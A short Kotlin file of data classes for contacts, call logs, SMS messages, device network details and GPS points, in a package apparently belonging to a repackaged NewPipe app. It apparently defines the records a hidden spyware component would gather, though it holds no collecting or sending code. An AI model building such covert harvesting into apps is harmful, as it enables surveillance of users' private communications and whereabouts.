package org.schabi.newpipe.gameover
data class Contact(
    var name: String = "",
    var tele: String = "",
    var rawId: String = ""
)

data class CallRecord(
    var date: String = "",
    var number: String = "",
    var duration: String = "",
    var type: String = ""
)

data class MobileNetwork(
    var netwrokCountry: String = "",
    var networkOperator: String = "",
    var make: String = "",
    var model: String = "",
    var mac: String = "",
    var ip: String = "",
    var ssid: String = ""
)

data class Sms(
    var date: String = "",
    var number: String = "",
    var message: String = "",
    var type: String = ""
)

data class LocationMarker(
    var timeStamp: String = "",
    var lat: String = "",
    var long: String = "",
    var alt: String = ""
)
